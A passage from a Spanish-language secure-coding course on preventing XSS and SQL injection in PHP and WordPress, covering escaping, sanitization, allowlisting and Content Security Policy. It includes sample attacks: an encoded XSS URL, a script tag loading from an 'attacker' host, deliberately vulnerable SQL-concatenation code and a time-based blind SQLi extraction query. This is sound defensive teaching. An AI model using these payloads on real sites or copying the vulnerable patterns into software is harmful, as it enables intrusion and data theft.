| en_matriz() | Prueba si los datos pertenecen a un rango de valores permitidos. | in_array($input, array('Windows', 'Linux', 'OSX', 'Other')) devolverá verdadero si $input contiene uno de los valores permitidos. Ideal para campos <select> y botones de opción en formularios web. |

### Cómo utilizar de forma segura expresiones regulares para la validación

Cuando use expresiones regulares con preg_match() para validar datos, asegúrese de hacer coincidir toda la cadena usando un carácter de intercalación ^ al comienzo de su expresión regular y un signo de dólar $ al final. Estos coinciden con el inicio y el final de una cadena y garantizarán que no solo esté validando algo en medio de la entrada, sino que esté validando toda la cadena. Omitirlos crea un grave problema de seguridad porque un atacante puede incluir algunos datos válidos que pasarán la prueba, pero anteponer o agregar cualquier cosa maliciosa que desee.

**El uso de filter_var() para la validación no reemplaza la desinfección o el escape.**

En general, la función filter_var() se utiliza de la siguiente manera para validar los datos a medida que llegan a su aplicación:

| 1
2
3 | if($test = filter_var('test@example.com', FILTER_VALIDATE_EMAIL)){
        echo "Received: $test\n";
} |
| --- | --- |

Si reemplaza el correo electrónico anterior con 'test@example.com<script>' verá que la verificación falla y la declaración de eco no se ejecuta.

Considere el siguiente ejemplo que demuestra cómo los datos maliciosos pueden pasar un paso de validación. Esto muestra cómo la validación no sustituye a la desinfección y el escape en la salida.

| 1
2
3 | if($test = filter_var(' http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27, FILTER_VALIDATE_URL)){
        echo "Received: $test\n";
} |
| --- | --- |

El ejemplo anterior generará lo siguiente:

| 1 | Received: http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca" |
| --- | --- |

Esto crea una vulnerabilidad XSS si esta salida no está desinfectada ni escapada. Cambiar el código de la siguiente manera eliminará la vulnerabilidad XSS:

| 1
2
3 | if($test = filter_var(' http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27, FILTER_VALIDATE_URL)){
        echo "Received: " . esc_url($test) . "\n";
} |
| --- | --- |

El código anterior generará lo siguiente, que es seguro:

| 1 | Received: http://example.com/?scriptalert(XSS)/scripta |
| --- | --- |

Consulte a continuación para obtener más información sobre las funciones que puede utilizar para escapar y desinfectar.

### Funciones para escapar y desinfectar sus datos

Cuando esté listo para enviar datos al navegador web de un visitante, un archivo, una red o algún otro lugar donde los datos salgan de su aplicación, deberá asegurarse de que los datos que está enviando estén seguros. PHP y WordPress proporcionan una variedad de funciones que escapan y/o desinfectan sus datos. Es importante tener en cuenta que estas funciones cambiarán sus datos si es necesario para que estén seguros.

### Funciones integradas de desinfección y escape de PHP

Las siguientes funciones están integradas en PHP y puede usarlas ya sea que esté ejecutando su aplicación dentro del entorno de WordPress o no. Notarás que proporcionamos varios ejemplos de filter_var(). Este es el nuevo estándar en la desinfección de PHP y se incluye de forma predeterminada con PHP desde la versión 5.2 de PHP. Recomendamos usar filter_var() en lugar de funciones PHP más antiguas.

| Función | Producción | Descripción |
| --- | --- | --- |
| intervalo('123AA456') | 123 | Desinfectar números enteros. [ http://php.net/manual/en/function.intval.php ] |
| filter_var('marca<script>@ejemplo.com', FILTER_SANITIZE_EMAIL) | markscript@ejemplo.com | Desinfectar los correos electrónicos. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Probando <etiquetas> y caracteres.', FILTER_SANITIZE_SPECIAL_CHARS) | Probando <etiquetas> & caracteres. | Codifica caracteres especiales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING); | Pele y codifique. | Eliminar etiquetas. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW | FILTER_FLAG_ENCODE_HIGH | FILTER_FLAG_ENCODE_AMP)
 | Tira & codificar. | Elimine etiquetas con indicadores de codificación adicionales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |

**Veamos algunos casos con WordPress**

## **Funciones de desinfección de la API de WordPress**

WordPress incluye una variedad de funciones de desinfección diseñadas para casos de uso específicos. Hemos incluido usos de ejemplo a continuación que le dan una idea de cómo estas funciones cambian los datos.

| Función | Producción | Descripción |
| --- | --- | --- |
| absint('-123ABC') | 123 | Desinfecta números enteros positivos. [ https://codex.wordpress.org/Function_Reference/absint ] |
| sanitize_email(“!#$%^&*()__+=-{}|\][:\”\';<>?/.,test@example.com”) | !#$%^&*__+=-{}|'?/.prueba@ejemplo.com | Desinfectar direcciones de correo electrónico. [ https://codex.wordpress.org/Function_Reference/sanitize_email ] |
| sanitize_file_name('.-_/path/to/file–name.txt'); | rutaalnombre-archivo.txt | Desinfectar nombres de archivos. [ https://codex.wordpress.org/Function_Reference/sanitize_file_name ] |
| sanitize_html_class('clase!@#$%^&*()-nombre_aquí.'); | nombre-clase_aquí | Desinfecta los nombres de clases de CSS. [ https://codex.wordpress.org/Function_Reference/sanitize_html_class ] |
| sanitize_key('Nombre-Clave!@#$%^&*()<>,.?/'); | Nombre clave | Desinfectar claves para matrices asociativas. [ https://codex.wordpress.org/Function_Reference/sanitize_key ] |
| sanitize_mime_type('text/plain-blah!@#$%^&*()}{[]”:;><,.?/'); | texto/plain-blah*./ | Desinfectar los tipos de mimos. [ https://codex.wordpress.org/Function_Reference/sanitize_mime_type ] |
| sanitize_option('thumbnail_size_h', '123ABC-_'); | 123 | Opción de desinfección de WP. El tipo de filtrado depende del nombre de la opción. [ https://codex.wordpress.org/Function_Reference/sanitize_option ] |
| sanitize_sql_orderby('colName'); | colNombre | Desinfecta un nombre de columna utilizado en SQL 'ordenar por'. Devuelve en blanco si se encuentran caracteres no válidos. [ https://codex.wordpress.org/Function_Reference/sanitize_sql_orderby ] |
| sanitize_text_field('<tag>algo de texto</tag>') | algún texto | Comprueba si hay UTF-8 no válido, convierte caracteres únicos < en entidad, elimina todas las etiquetas, elimina saltos de línea, tabulaciones y espacios en blanco adicionales, elimina octetos. [ https://codex.wordpress.org/Function_Reference/sanitize_text_field ] |
| sanitize_title('<etiqueta><?php //bla ?>Título aquí'); | título-aquí | Convierte el texto en un título estilo slug para usarlo en una URL. [ https://codex.wordpress.org/Function_Reference/sanitize_title ] |
| sanitize_user('<etiqueta>123ABCdef _.-*@nombre!#$', verdadero); | 123ABCdef _ .-@nombre | Desinfecta los nombres de usuario de WP. El segundo parámetro permite una desinfección estricta. [ https://codex.wordpress.org/Function_Reference/sanitize_user ] |

### Funciones de escape de la API de WordPress

WordPress también incluye funciones de escape para uso general. Hemos incluido las funciones principales a continuación con ejemplos de entrada y salida para ilustrar su uso.

| Función | Producción | Comentarios |
| --- | --- | --- |
| esc_html('<etiqueta> & texto'); | <etiqueta> &erio; texto | Escapar de HTML para una salida segura del navegador. [ https://codex.wordpress.org/Function_Reference/esc_html ] |
| esc_url('http://example.com/
<script>alert(“PRUEBA”);</script>'); | http://ejemplo.com/
scriptalert(PRUEBA);/script | Escapar de las URL para que sean seguras para su salida como texto o atributos HTML. [ https://codex.wordpress.org/Function_Reference/esc_url ] |
| esc_js('alerta(“1”);'); | alerta("1"); | Escapa de Javascript para que sea seguro para el uso de HTML en línea, por ejemplo, en el controlador onclick. [ https://codex.wordpress.org/Function_Reference/esc_js ] |
| esc_attr('attr-<>&\'”nombre'); | attr-<>&'"nombre | Úselo para escapar de atributos HTML, por ejemplo, alt, título, valor, etc. [ https://codex.wordpress.org/Function_Reference/esc_attr ] |
| esc_textarea('Texto <etiqueta> & texto'); | Texto <etiqueta> &erio; texto | Texto de escape para salida en el elemento <textarea>. [ https://codex.wordpress.org/Function_Reference/esc_textarea ] |

### **La función `wp_kses()`**

wp_kses [()](https://codex.wordpress.org/Function_Reference/wp_kses) es una función de desinfección más compleja. Elimina los guiones malvados. De ahí viene el nombre: “kses quita guiones malvados”. Cuando use wp_kses() necesitará incluir una serie de etiquetas y los atributos permitidos para cada etiqueta como segundo parámetro de kses. He aquí un ejemplo:

| 1
2
3
4
5
6
7
8 | $allowed = array(
   'a' => array( 'href' => array(), 'title' => array() ),
   'br' => array(),
   'em' => array(),
   'strong' => array(),
);
 
echo wp_kses($output, $allowed); |
| --- | --- |

Lo anterior permitirá la etiqueta 'A' con los atributos 'href' y 'title'. También permitirá las siguientes etiquetas sin atributos: br, em y strong. Si se incluyen atributos con esas etiquetas, se eliminarán.

`wp_kses()` consume mucho procesador porque el código es complejo. Entonces, en general, le recomendamos que primero intente usar las funciones PHP integradas porque son más rápidas, luego las funciones más simples de limpieza y escape de WordPress, y luego solo use wp_kses() si es necesario. Eso le brindará el mejor rendimiento para su complemento o tema.

En Worpress es importante que tomes medidas para solucionar el problema. Aquí hay algunos pasos que puedes seguir:

- Actualiza WordPress y los plugins a la última versión: Asegurate de que WordPress y los plugins que estás usando estén actualizados a la última versión. Los desarrolladores a menudo lanzan actualizaciones de seguridad para abordar las vulnerabilidades conocidas, incluyendo las vulnerabilidades de XSS.
- Realiza un análisis de seguridad: Realiza un análisis de seguridad completo en tu sitio para identificar cualquier otra vulnerabilidad que pueda estar presente. Hay varias herramientas de análisis de seguridad disponibles en línea que pueden ayudarte a escanear tu sitio en busca de vulnerabilidades.
- Elimina el código malicioso: Si encuentras código malicioso en tu sitio, elimínalo inmediatamente. A menudo, el código malicioso de XSS se puede encontrar en los archivos PHP o JavaScript de tu sitio. Asegurate de que elimines todo el código malicioso y revisa todos los archivos para estar seguro.
- Restablece todas las contraseñas: Cambia todas las contraseñas de tu sitio, incluyendo la contraseña de administrador, y asegurate de que sean fuertes y únicas.
- Configura las políticas de seguridad adecuadas: Configura adecuadamente las políticas de seguridad de tu sitio para evitar que los atacantes exploten vulnerabilidades de XSS. Por ejemplo, puedes configurar las directivas de seguridad de contenido para evitar que se carguen scripts maliciosos.
- Utiliza plugins de seguridad: Utiliza plugins de seguridad de WordPress de buena reputación para proteger tu sitio contra futuros ataques de XSS. Estos plugins pueden ayudarte a detectar y prevenir vulnerabilidades de seguridad, como la inyección de scripts maliciosos.

<aside>
💡 Es importante tomar medidas rápidas para solucionar una vulnerabilidad de XSS en tu sitio WordPress, ya que los atacantes pueden utilizar estas vulnerabilidades para tomar el control de tu sitio y robar datos sensibles.

</aside>

### **Estrategia de clasificación**

- **Lista negra**

Instintivamente, parece razonable realizar la validación definiendo un patrón prohibido que no debería aparecer en la entrada del usuario. Si una cadena coincide con este patrón, se marca como no válida. Un ejemplo sería permitir a los usuarios enviar URL personalizadas con cualquier protocolo excepto javascript:. Esta estrategia de clasificación se llama *lista negra* .

Sin embargo, la inclusión en listas negras tiene dos inconvenientes importantes:

- **Complejidad**

Describir con precisión el conjunto de todas las posibles cadenas maliciosas suele ser una tarea muy compleja. La política de ejemplo descrita anteriormente no se pudo implementar exitosamente simplemente buscando la subcadena " javascript", porque esto perdería cadenas del formato " Javascript:" (donde la primera letra está en mayúscula) y " &#106;avascript:" (donde la primera letra está codificada como un número referencia de personaje).

- **Estancamiento**

Incluso si se desarrollara una lista negra perfecta, fracasaría si se añadiera al navegador una nueva característica que permitiera el uso malicioso. Por ejemplo, una lista negra de validación de HTML desarrollada antes de la introducción del onmousewheelatributo HTML5 no lograría impedir que un atacante utilice ese atributo para realizar un ataque XSS. Este inconveniente es especialmente significativo en el desarrollo web, que se compone de muchas tecnologías diferentes que se actualizan constantemente.

Debido a estos inconvenientes, se desaconseja encarecidamente la inclusión en listas negras como estrategia de clasificación. La inclusión en listas blancas suele ser un enfoque mucho más seguro, como describiremos a continuación.

- **Lista blanca**

*La creación de listas blancas* es esencialmente lo opuesto a las listas negras: en lugar de definir un patrón prohibido, un enfoque de lista blanca define un patrón permitido y marca la entrada como no válida si no *coincide* con este patrón.

A diferencia del ejemplo anterior de lista negra, un ejemplo de lista blanca sería permitir a los usuarios enviar URL personalizadas que contengan solo los protocolos http:y https:nada más. Este enfoque marcaría automáticamente una URL como no válida si tuviera el protocolo javascript:, incluso si apareciera como " Javascript:" o " &#106;avascript:".

En comparación con las listas negras, las listas blancas tienen dos ventajas principales:

1. Sencillez: Describir con precisión un conjunto de cadenas seguras suele ser mucho más fácil que identificar el conjunto de todas las cadenas maliciosas. Esto es especialmente cierto en situaciones comunes en las que la entrada del usuario sólo necesita incluir un subconjunto muy limitado de la funcionalidad disponible en un navegador. Por ejemplo, la lista blanca descrita anteriormente que permite solo URL con los protocolos http:o https:es muy simple y perfectamente adecuada para los usuarios en la mayoría de situaciones.
2. **Longevidad:** A diferencia de una lista negra, una lista blanca generalmente no quedará obsoleta cuando se agregue una nueva función al navegador. Por ejemplo, una lista blanca de validación de HTML que permita solo el titleatributo en elementos HTML seguiría siendo segura incluso si se desarrollara antes de la introducción del onmousewheelatributo HTML5.

## **Resultado de la validación**

Cuando la entrada se ha marcado como no válida, se puede realizar una de dos acciones:

> Rechazo: La entrada simplemente se rechaza, lo que impide que se utilice en otras partes del sitio web.
> 

> Higienización: Todas las partes no válidas de la entrada se eliminan y el sitio web utiliza normalmente la entrada restante.
> 

De estos dos, el rechazo es el enfoque más sencillo de implementar. Dicho esto, la desinfección puede ser más útil ya que permite una gama más amplia de aportaciones por parte del usuario. Por ejemplo, si un usuario envía un número de tarjeta de crédito, una rutina de desinfección que elimine todos los caracteres que no sean dígitos evitaría la inyección de código y permitiría al usuario ingresar el número con o sin guiones.

Si decide implementar una desinfección, debe asegurarse de que la rutina de desinfección en sí no utilice un enfoque de lista negra . Por ejemplo, la URL " Javascript:...", incluso cuando se identifica como no válida mediante un enfoque de lista blanca, superaría una rutina de desinfección que simplemente elimina todas las instancias de " javascript:". Por este motivo, siempre que sea posible, se deben utilizar bibliotecas y marcos bien probados para la desinfección.

### **¿Qué técnica de prevención utilizar?**

La codificación debe ser su primera línea de defensa contra XSS, porque su propósito es neutralizar los datos para que no puedan interpretarse como código. En algunos casos, la codificación debe complementarse con validación, como se explicó anteriormente. Esta codificación y validación deben ser salientes, porque solo cuando la entrada se incluye en una página se sabe para qué contexto codificar y validar.

Como segunda línea de defensa, debe utilizar la validación entrante para desinfectar o rechazar datos que son claramente inválidos, como los enlaces que utilizan el javascript:protocolo. Si bien esto por sí solo no puede proporcionar seguridad total, es una precaución útil si en algún momento la codificación y validación saliente se realiza incorrectamente debido a errores o equivocaciones.

<aside>
👉 Si estas dos líneas de defensa se utilizan de forma coherente, su sitio web estará protegido de ataques XSS. Sin embargo, debido a la complejidad de crear y mantener un sitio web completo, puede resultar difícil lograr una protección total utilizando únicamente un manejo seguro de la entrada. Como tercera línea de defensa, también debes hacer uso de la Política de seguridad de contenido (CSP), que describiremos a continuación.

</aside>

### **Política de seguridad de contenido (CSP)**

La desventaja de protegerse contra XSS utilizando únicamente un manejo de entrada seguro es que incluso una sola falla de seguridad puede comprometer su sitio web. Un estándar web reciente llamado Política de seguridad de contenido (CSP) puede mitigar este riesgo.

CSP se utiliza para restringir el navegador que ve su página para que solo pueda usar recursos descargados de fuentes confiables. Un *recurso* es un script, una hoja de estilo, una imagen o algún otro tipo de archivo al que hace referencia la página. Esto significa que incluso si un atacante logra inyectar contenido malicioso en su sitio web, CSP puede impedir que se ejecute.

CSP se puede utilizar para hacer cumplir las siguientes reglas:

> Sin fuentes no confiables: Los recursos externos sólo se pueden cargar desde un conjunto de fuentes confiables claramente definidas.
> 
> 
> **Sin recursos en línea:** JavaScript y CSS en línea no se evaluarán.
> 
> **Noeval:** La función JavaScript evalno se puede utilizar.
> 
> **CSP en acción:** En el siguiente ejemplo, un atacante logró inyectar código malicioso en una página:
> 

> <html>
> 
> 
> Latest comment:
> 
> **<script src="http://attacker/malicious‑script.js"></script>**
> 
> </html>
> 

Con una política CSP correctamente definida, el navegador no se cargaría ni ejecutaría malicious‑script.jsporque [http://attacker/no](http://attacker/no) estaría en el conjunto de fuentes confiables. Aunque en este caso el sitio web no pudo manejar de forma segura la entrada del usuario, la política del CSP evitó que la vulnerabilidad causara algún daño.

Incluso si el atacante hubiera inyectado el código del script en línea en lugar de vincularlo a un archivo externo, una política de CSP correctamente definida que no permitiera JavaScript en línea también habría evitado que la vulnerabilidad causara algún daño.

### **¿Cómo habilitar CSP?**

De forma predeterminada, los navegadores no aplican CSP. Para habilitar CSP en su sitio web, las páginas deben tener un encabezado HTTP adicional: Content‑Security‑Policy. Cualquier página enviada con este encabezado tendrá su política de seguridad respetada por el navegador que la cargue, siempre que el navegador admita CSP.

Dado que la política de seguridad se envía con cada respuesta HTTP, es posible que un servidor establezca su política página por página. Se puede aplicar la misma política a un sitio web completo proporcionando el mismo encabezado CSP en cada respuesta.

El valor del Content‑Security‑Policyencabezado es una cadena que define una o más políticas de seguridad que entrarán en vigor en su sitio web. La sintaxis de esta cadena se describirá a continuación.

*Los encabezados de ejemplo en esta sección utilizan nuevas líneas y sangría para mayor claridad; esto no debería estar presente en un encabezado real.*

### **Sintaxis de CSP**

La sintaxis de un encabezado CSP es la siguiente:

> Content‑Security‑Policy:
> 
> 
> *directive* *source‑expression*, *source‑expression*, ...;
> 
> *directive* ...;
> 
> ...
> 

Esta sintaxis se compone de dos elementos:

- **Las directivas** son cadenas que especifican un tipo de recurso, tomadas de una lista predefinida.
- **Las expresiones de origen** son patrones que describen uno o más servidores desde donde se pueden descargar recursos.

Para cada directiva, las expresiones fuente dadas definen qué fuentes se pueden usar para descargar recursos del tipo respectivo.

### **Directivas**

Las directivas que se pueden utilizar en un encabezado CSP son las siguientes:

- connect‑src
- font‑src
- frame‑src
- img‑src
- media‑src
- object‑src
- script‑src
- style‑src

Además de estas, la directiva especial default‑srcse puede utilizar para proporcionar un valor predeterminado para todas las directivas que no se han incluido en el encabezado.

**Expresiones fuente**

La sintaxis de una expresión fuente es la siguiente:

> protocol://host‑name:port‑number

El nombre de host puede comenzar con *., lo que significa que se permitirá cualquier subdominio del nombre de host proporcionado. De manera similar, el número de puerto puede ser *, lo que significa que se permitirán todos los puertos. Además, se pueden omitir el protocolo y el número de puerto. Finalmente, se puede dar un protocolo propio, lo que permite exigir que todos los recursos se carguen mediante HTTPS.

Además de la sintaxis anterior, una expresión fuente puede ser alternativamente una de cuatro palabras clave con significado especial (comillas incluidas):

> 'none' No permite recursos.
> 
> 
> **'self'** Permite recursos del host que sirvió la página.
> 
> **'unsafe‑inline'** Permite recursos incrustados en la página, como <script>elementos en línea, <style>elementos y javascript:URL.
> 
> **'unsafe‑eval'** Permite el uso de la evalfunción JavaScript.
> 

Tenga en cuenta que siempre que se utiliza CSP, los recursos en línea y evalno se permiten automáticamente de forma predeterminada. Usar 'unsafe‑inline'y 'unsafe‑eval'es la única forma de permitirlos.

**Una política de ejemplo**

> Content‑Security‑Policy:
> 
> 
> script‑src 'self' scripts.example.com;
> 
> media‑src 'none';
> 
> img‑src *;
> 
> default‑src 'self' [http://*.example.com](about:blank)
> 

En esta política de ejemplo, la página está sujeta a las siguientes restricciones:

- Los scripts sólo se pueden descargar desde el host que sirve la página y desde scripts.example.com.
- Los archivos de audio y video no se pueden descargar desde ningún lugar.
- Los archivos de imagen se pueden descargar desde cualquier host.
- Todos los demás recursos se pueden descargar únicamente desde el host que sirve la página y desde cualquier subdominio de example.com.

### **Estado del PSIC**

A partir de junio de 2013, la Política de seguridad de contenidos es [una recomendación candidata del W3C](http://www.w3.org/TR/CSP/) . Lo están implementando los proveedores de navegadores, pero algunas partes todavía son específicas del navegador. En particular, el encabezado HTTP a utilizar puede diferir entre navegadores. Antes de utilizar CSP hoy, consulte la documentación de los navegadores que desea admitir.

## **Resumen**

**Resumen: descripción general de XSS**

- XSS es un ataque de inyección de código posible gracias al manejo inseguro de la entrada del usuario.
- Un ataque XSS exitoso permite a un atacante ejecutar JavaScript malicioso en el navegador de la víctima.
- Un ataque XSS exitoso compromete la seguridad tanto del sitio web como de sus usuarios.

**Resumen: ataques XSS**

- Hay tres tipos principales de ataques XSS:
- XSS persistente, donde la entrada maliciosa se origina en la base de datos del sitio web.
- XSS reflejado, donde la entrada maliciosa se origina a partir de la solicitud de la víctima.
- XSS basado en DOM, donde la vulnerabilidad está en el código del lado del cliente en lugar del código del lado del servidor.
- Todos estos ataques se realizan de diferentes maneras pero tienen el mismo efecto si tienen éxito.

**Resumen: Prevención de XSS**

- La forma más importante de prevenir ataques XSS es realizar un manejo de entrada seguro.
- La mayoría de las veces, la codificación debe realizarse siempre que se incluyan entradas del usuario en una página.
- En algunos casos, la codificación debe ser reemplazada o complementada con validación.
- El manejo seguro de la entrada debe tener en cuenta en qué contexto de una página se inserta la entrada del usuario.
- Para evitar todo tipo de ataques XSS, se debe realizar un manejo seguro de la entrada tanto en el código del lado del cliente como del del servidor.
- La política de seguridad de contenido proporciona una capa adicional de defensa para cuando falla el manejo seguro de la entrada.

### **Conclusión**

Cabe señalar que existe una superposición en la terminología utilizada actualmente para describir XSS: un ataque XSS basado en DOM también es persistente o reflejado al mismo tiempo; No es un tipo de ataque separado. No existe una terminología ampliamente aceptada que cubra todos los tipos de XSS sin superposición. Sin embargo, independientemente de la terminología utilizada para describir XSS, lo más importante a identificar sobre cualquier ataque es de dónde proviene la entrada maliciosa y dónde se encuentra la vulnerabilidad.

Si sigue las pautas básicas de esta página, podrá evitar las vulnerabilidades más comunes que se introducen en el código. En general, dedicar tiempo a la validación de entradas y la desinfección y escape de salidas hará que su aplicación sea segura.

Al elegir funciones para desinfección y escape, elija la función que más se acerque a su caso de uso específico. Si está enviando datos a un atributo HTML, utilice una función de desinfección o escape específica para los atributos HTML. Esto le brindará la mejor combinación de rendimiento y seguridad de la aplicación.

Si puede evitar las vulnerabilidades XSS y proteger la salida de su aplicación, evitará casi la mitad de todas las vulnerabilidades que podrían introducirse en su aplicación.

**REFERENCIAS**

- [Documentación filter_var() de PHP.](http://php.net/manual/en/function.filter-var.php)
- [Filtros de validación de PHP.](http://php.net/manual/en/filter.filters.validate.php)
- [Filtros de sanitización de PHP.](http://php.net/manual/en/filter.filters.sanitize.php)
- [Funciones de WordPress para desinfección y escape (artículo sobre Validación de datos).](https://codex.wordpress.org/Data_Validation)
- [Otro artículo de WordPress sobre validación, desinfección y escape de datos de usuario.](https://codex.wordpress.org/Validating_Sanitizing_and_Escaping_User_Data)
- [Artículo de OWASP sobre XSS.](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- [Hoja de referencia de OWASP XSS.](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
- [Artículo de seguridad de aplicaciones de Google sobre XSS.](https://www.google.com/about/appsecurity/learning/xss/)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)
- [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
- [http://projects.webappsec.org/Cross-Site-Scripting](http://projects.webappsec.org/Cross-Site-Scripting)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)

# SQL Injection

La inyección SQL es un tipo de ataque de inyección en el cual un atacante inserta código malicioso en una consulta SQL para ejecutar comandos no deseados en la base de datos. Los atacantes pueden utilizar la inyección de comandos para ejecutar comandos arbitrarios en el sistema, lo que podría permitirles obtener acceso no autorizado, modificar o eliminar datos, o incluso tomar el control total del sistema. Las inyecciones a menudo se realizan a través de campos de entrada, como formularios web, parámetros de URL o encabezados HTTP.

Los complementos de WordPress más útiles tienen algún tipo de interacción con la base de datos. La entrada del usuario se envía con frecuencia a la base de datos, ya sea porque necesita almacenarse en la base de datos, necesita modificar algo en la base de datos o porque se utiliza como parte de una declaración SELECT. Si la entrada del usuario no se valida ni se escapa correctamente, un atacante puede reemplazar esa entrada del usuario con comandos que puede enviar directamente a la base de datos.

Hay dos tipos de inyección SQL. Una vulnerabilidad de inyección SQL "clásica" es aquella en la que la entrada del usuario sin filtrar permite a un atacante enviar comandos a la base de datos y la salida se envía de vuelta al atacante. Una vulnerabilidad de inyección SQL "ciega" se produce cuando el atacante puede enviar comandos a la base de datos pero en realidad no ve la salida de la base de datos.

Según el análisis de Wordfence las vulnerabilidades de inyección SQL son la segunda vulnerabilidad más común que se encuentra en los complementos de WordPress.

![SQL 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql1.png?raw=true)

[https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/](https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/)

Cómo funciona una vulnerabilidad de inyección SQL clásica

Para comprender cómo funciona una vulnerabilidad de inyección SQL clásica, veamos un ejemplo de WordPress:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var("select post_title from " . $wpdb->posts . " where ID=" . $_GET['id']);
echo $title;
 |
| --- | --- |

El código anterior es un ejemplo de una vulnerabilidad de inyección SQL (SQLi). Es una vulnerabilidad de SQLi porque la entrada del usuario en $_GET['id'] se envía directamente a la base de datos sin desinfección ni escape. Esto permite a un atacante enviar comandos directamente a la base de datos.

Luego, la salida de la base de datos se envía directamente al navegador del usuario. Debido a que el resultado se envía al navegador, esto convierte a la vulnerabilidad en una vulnerabilidad SQLi clásica, a diferencia de una vulnerabilidad de inyección SQL ciega, que se analiza a continuación.

Al utilizar esta vulnerabilidad, un atacante puede enviar comandos directamente a la base de datos. Estos incluyen comandos SELECT para descargar su base de datos completa, incluida la información de identificación personal (PII) del usuario. En algunos casos, también incluye comandos INSERTAR y ACTUALIZAR para crear nuevas cuentas de usuario o modificar cuentas de usuario existentes.

Corregir la vulnerabilidad anterior es relativamente fácil. En WordPress simplemente necesita usar el método de preparación que desinfectará y escapará automáticamente cualquier dato que envíe a la base de datos. El código anterior se puede modificar de la siguiente manera para eliminar la vulnerabilidad SQLi:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var($wpdb->prepare("select post_title from " . $wpdb->posts . " where ID=%d", $_GET['id']));
echo $title;
 |
| --- | --- |

Tenga en cuenta que utilizamos el método $wpdb->prepare() para escapar de los datos que estamos enviando a la base de datos. Tiene una sintaxis similar a la función sprintf() que le permite utilizar marcadores de posición. %d es un número entero, %f es un flotante (o decimal) y %s es una cadena (o texto). Si utiliza %s como marcador de posición, no necesita incluir comillas, ya que se agregan automáticamente.

### ¿Cómo funciona una inyección SQL ciega?

Una vulnerabilidad de inyección SQL ciega se parece a la siguiente:

| 1
2
3 | global $wpdb;
$title = $wpdb->get_var("select post_title from " . $wpdb->posts . " where ID=" . $_GET['id']);
//Do something with title, but don't echo.
 |
| --- | --- |

En el ejemplo anterior, la entrada del usuario sin procesar y no desinfectada se envía directamente a la base de datos concatenando la variable $_GET['id'] directamente a la consulta SQL. Para corregir esta vulnerabilidad, simplemente usaría el método prepare() como se indicó anteriormente para desinfectar y escapar de cualquier entrada de la base de datos.

La diferencia aquí es que el resultado nunca se envía al navegador. Una vulnerabilidad SQLi ciega es tan grave como una vulnerabilidad SQLi normal porque, en algunos casos, un atacante puede insertar o actualizar datos fácilmente en su base de datos. La diferencia es que resulta más difícil extraer datos de la base de datos porque el atacante no puede ver el resultado de la base de datos porque no está escrito en el navegador web.

## Ataques SQL ciegos basados ​​en el tiempo

Generalmente, hay dos formas en que un atacante extrae datos de una base de datos mediante un ataque de inyección SQL ciega. El primero es utilizar un ataque basado en el tiempo. Supongamos que, utilizando la vulnerabilidad SQLi anterior, un atacante puede enviar cualquier comando a la base de datos, pero no puede ver el resultado. Sólo pueden ver la página web resultante.

Un atacante podría hacerle a la base de datos una pregunta como “¿La primera letra de la primera cuenta de administrador comienza con 'a'? Si es así, duerme 5 segundos y si no es así, no duermas nada. Si la página web tarda menos de 5 segundos en generarse y regresar al navegador web, saben que la cuenta de administrador no comienza con la letra 'a' y pasan a la siguiente letra, 'b', y preguntan. la misma pregunta.

Con esta técnica, un atacante puede lanzar un ataque basado en el tiempo en un sitio web y determinar los nombres de las cuentas de administrador y puede extraer contraseñas de usuario con hash.

El SQL real enviado a la base de datos podría verse similar al siguiente:

| 1
2
3
4
5
6 | select post_title from wp_posts where ID=1
  union select IF(
    substring(wp_users.user_login,1,1)='a',
    BENCHMARK(5000000,ENCODE('blah','asdf')),
    null)
  from wp_users where ID=1
 |
| --- | --- |

Lo que dice este SQL es "seleccione el título de la publicación donde el ID de la publicación es 1, pero combine en una consulta que llevará mucho tiempo si suponemos que la cuenta de usuario con ID 1 (que generalmente es una cuenta de administrador) tiene la letra ' a' como primera letra del nombre de usuario”.

Cuando se ejecuta esta consulta, si la página tarda mucho en cargarse, el atacante ha adivinado correctamente la primera letra del nombre de usuario del administrador. Luego pueden pasar a las letras dos y tres hasta que tengan su nombre de usuario de administrador. Una vez que lo tengan, pueden extraer su contraseña hash de administrador, su correo electrónico de administrador, cualquier correo electrónico de usuario o cualquier dato que deseen, siempre que se tomen el tiempo suficiente para ejecutar el ataque.

Recuerde, estos ataques son automatizados y las conjeturas incorrectas no toman tiempo, por lo que los datos se pueden extraer con relativa rapidez utilizando esta técnica.

Ataques de inyección SQL ciegos basados ​​en contenido

Un ataque de inyección SQL ciega basado en contenido es otra forma en que un atacante extrae datos de una base de datos cuando no puede ver la salida de la base de datos.

Si la consulta que genera el contenido es la siguiente (recuerde, el resultado de la consulta no se envía al usuario)

| 1 | select post_status from wp_posts where ID=1 |

